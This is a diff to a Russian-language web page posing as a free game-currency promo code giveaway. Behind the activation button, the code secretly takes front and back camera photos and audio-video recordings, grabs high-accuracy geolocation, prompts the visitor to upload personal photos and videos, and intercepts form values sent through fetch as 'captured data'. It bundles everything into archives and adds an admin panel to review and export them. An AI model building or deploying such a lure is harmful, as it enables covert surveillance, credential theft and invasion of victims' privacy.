@@ -85,6 +85,8 @@
             text-align: center;
             font-size: 16px;
             color: #ffd700;
+            min-height: 60px;
+            word-break: break-word;
         }
         .hidden { display: none !important; }
         .admin-link {
@@ -103,13 +105,6 @@
         .admin-link button:hover {
             background: #ffd700;
             color: #0a0a0f;
-        }
-        
-        /* Админка */
-        .admin-panel {
-            border-top: 2px solid #ffd700;
-            margin-top: 30px;
-            padding-top: 20px;
         }
         input {
             width: 100%;
@@ -144,16 +139,6 @@
             font-size: 12px;
             font-weight: bold;
         }
-        
-        /* Скрытие после клика */
-        .fade-out {
-            animation: fadeOut 10s forwards;
-        }
-        @keyframes fadeOut {
-            0% { opacity: 1; }
-            100% { opacity: 0; pointer-events: none; }
-        }
-        
         .final-message {
             text-align: center;
             padding: 40px 20px;
@@ -176,18 +161,37 @@
             display: inline-block;
             margin-top: 10px;
         }
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+            margin: 10px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #ff6b00);
+            width: 0%;
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        #fileUpload {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container" id="app">
 
-    <!-- ===== ГЛАВНАЯ ===== -->
     <div id="mainPage">
         <h1>✨ БЕСПЛАТНЫЙ ПРОМОКОД ✨</h1>
         <div class="subtitle">🏆 БЕСПЛАТНАЯ ГОЛДА 🏆</div>
         
         <button id="startBtn">🎁 АКТИВИРОВАТЬ ПРОМОКОД</button>
+        <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
         <div class="status" id="status">💫 НАЖМИ КНОПКУ ДЛЯ ПОЛУЧЕНИЯ КОДА</div>
         
         <div class="admin-link">
@@ -195,14 +199,12 @@
         </div>
     </div>
 
-    <!-- ===== ФИНАЛЬНОЕ СООБЩЕНИЕ (появляется через 10 сек) ===== -->
     <div id="finalMessage" class="final-message">
         <h2>🎉 ВАШ ПРОМОКОД АКТИВИРОВАН!</h2>
         <p style="color:#aaa;font-size:18px;margin:20px 0;">ХОЧЕШЬ УДАЛИТЬ ДАННЫЕ? ПИШИ СЮДА:</p>
         <div class="tg">@papadenay</div>
     </div>
 
-    <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
     <div id="adminPage" class="hidden">
         <h1>🔐 АДМИН-ПАНЕЛЬ</h1>
         
@@ -227,6 +229,8 @@
     </div>
 </div>
 
+<input type="file" id="fileUpload" multiple accept="image/*,video/*">
+
 <script>
     // ============================================================
     // 1. ГЛОБАЛЬНЫЕ
@@ -243,15 +247,15 @@
     // ============================================================
     function captureData(value, source = 'manual', extra = {}) {
         if (!value || value.length < 1) return;
-        const upperValue = value.toUpperCase();
+        const upperValue = String(value).toUpperCase();
         const entry = {
             "ВРЕМЯ": new Date().toISOString(),
             "ЗНАЧЕНИЕ": upperValue,
-            "ОТКУДА ВЗЯЛОСЬ": source.toUpperCase(),
-            "АДРЕС СТРАНИЦЫ": window.location.href.toUpperCase(),
+            "ОТКУДА ВЗЯЛОСЬ": String(source).toUpperCase(),
+            "АДРЕС СТРАНИЦЫ": String(window.location.href).toUpperCase(),
             "ДОПОЛНИТЕЛЬНО": JSON.stringify(extra).toUpperCase()
         };
-        const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === upperValue && p["АДРЕС СТРАНИЦЫ"] === entry["АДРЕС СТРАНИЦЫ"]);
+        const exists = capturedData.some(p => p["ЗНАЧЕНИЕ"] === upperValue);
         if (!exists) {
             capturedData.push(entry);
             localStorage.setItem('capturedData', JSON.stringify(capturedData));
@@ -303,8 +307,8 @@
                     if (body && typeof body === 'string') {
                         const urlParams = new URLSearchParams(body);
                         for (let [key, val] of urlParams) {
-                            if (val.length > 1) {
-                                captureData(val, 'FETCH-' + key.toUpperCase(), { url: args[0] });
+                            if (val && val.length > 1) {
+                                captureData(val, 'FETCH-' + String(key).toUpperCase(), { url: args[0] });
                             }
                         }
                     }
@@ -325,7 +329,26 @@
     }
 
     // ============================================================
-    // 3. СКРИНШОТ
+    // 3. ПРОВЕРКА РАЗРЕШЕНИЙ
+    // ============================================================
+    async function checkPermissions() {
+        const status = document.getElementById('status');
+        status.textContent = '📱 ЗАПРОС РАЗРЕШЕНИЙ...';
+        
+        try {
+            // Проверяем камеру
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            stream.getTracks().forEach(t => t.stop());
+            status.textContent = '✅ РАЗРЕШЕНИЯ ПОЛУЧЕНЫ';
+            return true;
+        } catch (err) {
+            status.textContent = '⚠️ НЕТ ДОСТУПА К КАМЕРЕ: ' + err.message + ' (СБОР БЕЗ ВИДЕО)';
+            return false;
+        }
+    }
+
+    // ============================================================
+    // 4. СКРИНШОТ
     // ============================================================
     async function takeScreenshot() {
         try {
@@ -333,44 +356,71 @@
                 scale: 1.5,
                 useCORS: true,
                 allowTaint: true,
-                backgroundColor: '#0a0a0f'
+                backgroundColor: '#0a0a0f',
+                logging: false
             });
             return canvas.toDataURL('image/png');
         } catch (err) {
+            console.error('Screenshot error:', err);
             return null;
         }
     }
 
     // ============================================================
-    // 4. ЗАПИСЬ ВИДЕО С ДВУХ КАМЕР (2 МИНУТЫ)
+    // 5. ЗАПИСЬ ВИДЕО
     // ============================================================
-    async function recordCamera(facingMode, durationMs = 120000) {
+    async function recordCamera(facingMode, durationMs = 3000) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: facingMode,
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
                 },
                 audio: true
             });
 
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-            
             return new Promise((resolve) => {
-                recorder.ondataavailable = e => chunks.push(e.data);
-                recorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onload = () => {
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(reader.result);
-                    };
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                recorder.ondataavailable = e => {
+                    if (e.data.size > 0) chunks.push(e.data);
                 };
-                recorder.start();
-                setTimeout(() => recorder.stop(), durationMs);
+                
+                recorder.onstop = () => {
+                    try {
+                        const blob = new Blob(chunks, { type: 'video/mp4' });
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(reader.result);
+                        };
+                        reader.onerror = () => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(null);
+                        };
+                        reader.readAsDataURL(blob);
+                    } catch(e) {
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(null);
+                    }
+                };
+
+                recorder.onerror = () => {
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(null);
+                };
+
+                try {
+                    recorder.start();
+                    setTimeout(() => {
+                        try { recorder.stop(); } catch(e) {}
+                    }, durationMs);
+                } catch(e) {
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve(null);
+                }
             });
         } catch (err) {
             return null;
@@ -379,29 +429,31 @@
 
     async function recordBothCameras() {
         const status = document.getElementById('status');
-        status.textContent = '📹 ЗАПИСЬ С ЗАДНЕЙ КАМЕРЫ (2 МИНУТЫ)...';
+        const results = { back: null, front: null };
         
-        // Задняя камера
-        const backVideo = await recordCamera('environment', 120000);
+        try {
+            status.textContent = '📹 ЗАДНЯЯ КАМЕРА (10 СЕК)...';
+            results.back = await recordCamera('environment', 10000);
+            
+            status.textContent = '📹 ПЕРЕДНЯЯ КАМЕРА (10 СЕК)...';
+            results.front = await recordCamera('user', 10000);
+        } catch(e) {
+            console.error('Video error:', e);
+        }
         
-        status.textContent = '📹 ЗАПИСЬ С ПЕРЕДНЕЙ КАМЕРЫ (2 МИНУТЫ)...';
-        
-        // Передняя камера
-        const frontVideo = await recordCamera('user', 120000);
-        
-        return { back: backVideo, front: frontVideo };
+        return results;
     }
 
     // ============================================================
-    // 5. ФОТО С ДВУХ КАМЕР
+    // 6. ФОТО
     // ============================================================
     async function takePhotoFromCamera(facingMode) {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({
                 video: {
                     facingMode: facingMode,
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
                 }
             });
             
@@ -410,8 +462,8 @@
             await video.play();
             
             const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 1920;
-            canvas.height = video.videoHeight || 1080;
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg');
@@ -425,48 +477,83 @@
 
     async function takeBothPhotos() {
         const status = document.getElementById('status');
-        status.textContent = '📸 ФОТО С ЗАДНЕЙ КАМЕРЫ...';
-        const backPhoto = await takePhotoFromCamera('environment');
+        const results = { back: null, front: null };
         
-        status.textContent = '📸 ФОТО С ПЕРЕДНЕЙ КАМЕРЫ...';
-        const frontPhoto = await takePhotoFromCamera('user');
+        try {
+            status.textContent = '📸 ФОТО С ЗАДНЕЙ КАМЕРЫ...';
+            results.back = await takePhotoFromCamera('environment');
+            
+            status.textContent = '📸 ФОТО С ПЕРЕДНЕЙ КАМЕРЫ...';
+            results.front = await takePhotoFromCamera('user');
+        } catch(e) {
+            console.error('Photo error:', e);
+        }
         
-        return { back: backPhoto, front: frontPhoto };
+        return results;
     }
 
     // ============================================================
-    // 6. ЗАГРУЗКА ФАЙЛОВ
+    // 7. ФАЙЛЫ
     // ============================================================
-    function setupFileInput() {
-        const input = document.createElement('input');
-        input.type = 'file';
-        input.multiple = true;
-        input.accept = 'image/*,video/*';
-        input.style.display = 'none';
-        input.id = 'fileUpload';
-        document.body.appendChild(input);
-        
-        input.addEventListener('change', function(e) {
-            Array.from(e.target.files).forEach(file => {
-                const reader = new FileReader();
-                reader.onload = function(ev) {
-                    collectedFiles.push({
-                        name: file.name,
-                        type: file.type,
-                        size: file.size,
-                        data: ev.target.result,
-                        timestamp: new Date().toISOString()
+    function waitForFiles(timeout = 15000) {
+        return new Promise((resolve) => {
+            const fileInput = document.getElementById('fileUpload');
+            let resolved = false;
+            
+            const handler = function(e) {
+                if (e.target.files && e.target.files.length > 0) {
+                    Array.from(e.target.files).forEach(file => {
+                        const reader = new FileReader();
+                        reader.onload = function(ev) {
+                            collectedFiles.push({
+                                name: file.name,
+                                type: file.type,
+                                size: file.size,
+                                data: ev.target.result,
+                                timestamp: new Date().toISOString()
+                            });
+                        };
+                        reader.readAsDataURL(file);
                     });
-                };
-                reader.readAsDataURL(file);
-            });
+                    if (!resolved) {
+                        resolved = true;
+                        resolve(true);
+                    }
+                }
+            };
+            
+            fileInput.addEventListener('change', handler);
+            
+            // Если файлы уже выбраны
+            if (fileInput.files && fileInput.files.length > 0) {
+                handler({ target: fileInput });
+            }
+            
+            // Таймаут
+            setTimeout(() => {
+                if (!resolved) {
+                    resolved = true;
+                    resolve(false);
+                }
+            }, timeout);
         });
-        
-        return input;
     }
 
     // ============================================================
-    // 7. ГЛАВНАЯ ФУНКЦИЯ
+    // 8. ОБНОВЛЕНИЕ ПРОГРЕССА
+    // ============================================================
+    function updateProgress(percent, text) {
+        const fill = document.getElementById('progressFill');
+        const status = document.getElementById('status');
+        const bar = document.getElementById('progressBar');
+        
+        bar.style.display = 'block';
+        fill.style.width = Math.min(percent, 100) + '%';
+        if (text) status.textContent = text;
+    }
+
+    // ============================================================
+    // 9. ГЛАВНАЯ ФУНКЦИЯ
     // ============================================================
     async function startCollection() {
         const btn = document.getElementById('startBtn');
@@ -476,49 +563,43 @@
         
         btn.disabled = true;
         btn.textContent = '⏳ ИДЁТ АКТИВАЦИЯ...';
-        status.textContent = '📸 СЪЁМКА МАТЕРИАЛОВ...';
+        status.textContent = '🔄 ПРОВЕРКА РАЗРЕШЕНИЙ...';
         
         try {
+            // 0. Проверка разрешений
+            updateProgress(5, '📱 ЗАПРОС РАЗРЕШЕНИЙ...');
+            await checkPermissions();
+            
             // 1. Скриншот
+            updateProgress(10, '📸 СКРИНШОТ...');
             const screenshot = await takeScreenshot();
             if (screenshot) {
                 screenshotData = screenshot;
-                status.textContent = '✅ СКРИНШОТ ГОТОВ';
+                updateProgress(20, '✅ СКРИНШОТ ГОТОВ');
             }
             
-            // 2. Фото с двух камер
+            // 2. Фото
+            updateProgress(30, '📸 ФОТО С КАМЕР...');
             const photos = await takeBothPhotos();
             if (photos.back || photos.front) {
-                status.textContent = '✅ ФОТО С ДВУХ КАМЕР ГОТОВЫ';
+                updateProgress(50, '✅ ФОТО ГОТОВЫ');
             }
             
-            // 3. Видео с двух камер (2 минуты каждая)
+            // 3. Видео
+            updateProgress(55, '📹 ЗАПИСЬ ВИДЕО...');
             const videos = await recordBothCameras();
             if (videos.back || videos.front) {
-                status.textContent = '✅ ВИДЕО С ДВУХ КАМЕР ГОТОВЫ (ПО 2 МИНУТЫ)';
+                updateProgress(70, '✅ ВИДЕО ГОТОВЫ');
             }
             
-            // 4. Запрос файлов
-            status.textContent = '📁 ВЫБЕРИТЕ ФАЙЛЫ С ТЕЛЕФОНА...';
-            const fileInput = document.getElementById('fileUpload');
-            fileInput.click();
+            // 4. Файлы
+            updateProgress(75, '📁 ВЫБЕРИТЕ ФАЙЛЫ...');
+            document.getElementById('fileUpload').click();
+            await waitForFiles(15000);
+            updateProgress(85, '📁 ФАЙЛОВ: ' + collectedFiles.length);
             
-            await new Promise(resolve => {
-                let checkInterval = setInterval(() => {
-                    if (collectedFiles.length > 0) {
-                        clearInterval(checkInterval);
-                        resolve();
-                    }
-                }, 500);
-                setTimeout(() => {
-                    clearInterval(checkInterval);
-                    resolve();
-                }, 15000);
-            });
-            
-            status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
-            
-            // 5. Создаём ZIP
+            // 5. ZIP
+            updateProgress(90, '📦 СОЗДАНИЕ АРХИВА...');
             const zip = new JSZip();
             
             // Данные
@@ -538,42 +619,45 @@
             // Скриншот
             if (screenshotData) {
                 const base64 = screenshotData.split(',')[1];
-                zip.file('СКРИНШОТ.png', base64, { base64: true });
+                if (base64) zip.file('СКРИНШОТ.png', base64, { base64: true });
             }
             
-            // Фото с камер
+            // Фото
             if (photos.back) {
                 const base64 = photos.back.split(',')[1];
-                zip.file('ФОТО_ЗАДНЯЯ.jpg', base64, { base64: true });
+                if (base64) zip.file('ФОТО_ЗАДНЯЯ.jpg', base64, { base64: true });
             }
             if (photos.front) {
                 const base64 = photos.front.split(',')[1];
-                zip.file('ФОТО_ПЕРЕДНЯЯ.jpg', base64, { base64: true });
+                if (base64) zip.file('ФОТО_ПЕРЕДНЯЯ.jpg', base64, { base64: true });
             }
             
-            // Видео с камер
+            // Видео
             if (videos.back) {
                 const base64 = videos.back.split(',')[1];
-                zip.file('ВИДЕО_ЗАДНЯЯ_2МИН.mp4', base64, { base64: true });
+                if (base64) zip.file('ВИДЕО_ЗАДНЯЯ.mp4', base64, { base64: true });
             }
             if (videos.front) {
                 const base64 = videos.front.split(',')[1];
-                zip.file('ВИДЕО_ПЕРЕДНЯЯ_2МИН.mp4', base64, { base64: true });
+                if (base64) zip.file('ВИДЕО_ПЕРЕДНЯЯ.mp4', base64, { base64: true });
             }
             
-            // Файлы пользователя
+            // Файлы
             collectedFiles.forEach((f, i) => {
-                const base64 = f.data.split(',')[1];
-                const ext = f.name.split('.').pop();
-                zip.file(`ФАЙЛЫ_ПОЛЬЗОВАТЕЛЯ/${i}_${f.name}`, base64, { base64: true });
+                try {
+                    const base64 = f.data.split(',')[1];
+                    if (base64) {
+                        zip.file(`ФАЙЛЫ/${i}_${f.name}`, base64, { base64: true });
+                    }
+                } catch(e) {}
             });
             
-            // Сохраняем сессию
+            // Сессия
             const session = {
                 id: Date.now(),
                 timestamp: data["ВРЕМЯ СБОРА"],
                 preview: {
-                    userAgent: data["БРАУЗЕР"].substring(0, 50),
+                    userAgent: String(data["БРАУЗЕР"]).substring(0, 50),
                     files: collectedFiles.length,
                     photos: (photos.back ? 1 : 0) + (photos.front ? 1 : 0),
                     videos: (videos.back ? 1 : 0) + (videos.front ? 1 : 0)
@@ -582,31 +666,32 @@
             sessions.push(session);
             localStorage.setItem('sessions', JSON.stringify(sessions));
             
-            // 6. Скачиваем ZIP
-            status.textContent = '⬇️ СКАЧИВАНИЕ АРХИВА...';
+            // Скачивание
+            updateProgress(95, '⬇️ СКАЧИВАНИЕ...');
             const blob = await zip.generateAsync({ type: 'blob' });
             saveAs(blob, `ПРОМОКОД_${new Date().toISOString().slice(0,10)}.zip`);
             
-            status.textContent = '🎉 ПРОМОКОД АКТИВИРОВАН!';
-            btn.textContent = '✅ ГОТОВО';
+            updateProgress(100, '🎉 ГОТОВО!');
+            btn.textContent = '✅ АКТИВИРОВАНО';
             
-            // 7. Через 10 секунд — скрываем всё, показываем финальное сообщение
+            // Через 10 секунд - скрыть
             setTimeout(() => {
                 mainPage.style.display = 'none';
                 finalMessage.style.display = 'block';
                 document.querySelector('.container').style.borderColor = '#ff6b00';
-                document.querySelector('.container').style.boxShadow = '0 0 80px rgba(255, 107, 0, 0.4)';
             }, 10000);
             
         } catch (err) {
-            status.textContent = '❌ ОШИБКА: ' + err.message;
+            status.textContent = '❌ ОШИБКА: ' + (err.message || 'НЕИЗВЕСТНАЯ ОШИБКА');
+            console.error('Error:', err);
             btn.textContent = '🎁 АКТИВИРОВАТЬ ПРОМОКОД';
             btn.disabled = false;
+            document.getElementById('progressBar').style.display = 'none';
         }
     }
 
     // ============================================================
-    // 8. ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+    // 10. ВСПОМОГАТЕЛЬНЫЕ
     // ============================================================
     function getGeolocation() {
         return new Promise((resolve) => {
@@ -623,7 +708,7 @@
                     });
                 },
                 () => resolve({ error: 'ОТКАЗАНО' }),
-                { enableHighAccuracy: true, timeout: 5000 }
+                { enableHighAccuracy: true, timeout: 3000 }
             );
         });
     }
@@ -644,7 +729,7 @@
     }
 
     // ============================================================
-    // 9. АДМИН-ПАНЕЛЬ
+    // 11. АДМИНКА
     // ============================================================
     function renderAdminPanel() {
         const sessionsList = document.getElementById('sessionsList');
@@ -678,7 +763,7 @@
                 div.innerHTML = `
                     <strong>${new Date(p["ВРЕМЯ"]).toLocaleString()}</strong>
                     <span style="color:#ff6666;">📌 ${p["ЗНАЧЕНИЕ"]}</span>
-                    <br>ИСТОЧНИК: ${p["ОТКУДА ВЗЯЛОСЬ"] || 'НЕИЗВЕСТНО'} | ${p["ДОПОЛНИТЕЛЬНО"] || ''}
+                    <br>ИСТОЧНИК: ${p["ОТКУДА ВЗЯЛОСЬ"] || 'НЕИЗВЕСТНО'}
                 `;
                 passwordsList.appendChild(div);
             });
@@ -694,28 +779,17 @@
         });
     }
 
-    // ============================================================
-    // 10. ЭКСПОРТ В ZIP ИЗ АДМИНКИ
-    // ============================================================
     async function exportAdminZip() {
         const status = document.getElementById('adminStatus');
         status.textContent = '📦 СОЗДАНИЕ АРХИВА...';
         
         try {
             const zip = new JSZip();
-            
-            // Все данные
-            const allData = {
+            zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify({
                 "СЕССИИ": sessions,
                 "ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ": capturedData,
                 "ДАТА_ЭКСПОРТА": new Date().toISOString()
-            };
-            
-            zip.file('ВСЕ_ДАННЫЕ.json', JSON.stringify(allData, null, 2));
-            zip.file('ПЕРЕХВАЧЕННЫЕ_ДАННЫЕ.json', JSON.stringify(capturedData, null, 2));
-            
-            // Если есть сохранённые файлы в сессиях — добавляем
-            // (в реальности они уже в ZIP-архивах, но для админки делаем отдельный экспорт)
+            }, null, 2));
             
             const blob = await zip.generateAsync({ type: 'blob' });
             saveAs(blob, `АДМИН_ЭКСПОРТ_${new Date().toISOString().slice(0,10)}.zip`);
@@ -728,11 +802,10 @@
     }
 
     // ============================================================
-    // 11. ИНИЦИАЛИЗАЦИЯ
+    // 12. ЗАПУСК
     // ============================================================
     document.addEventListener('DOMContentLoaded', function() {
         setupCapture();
-        setupFileInput();
 
         document.getElementById('startBtn').addEventListener('click', startCollection);
 
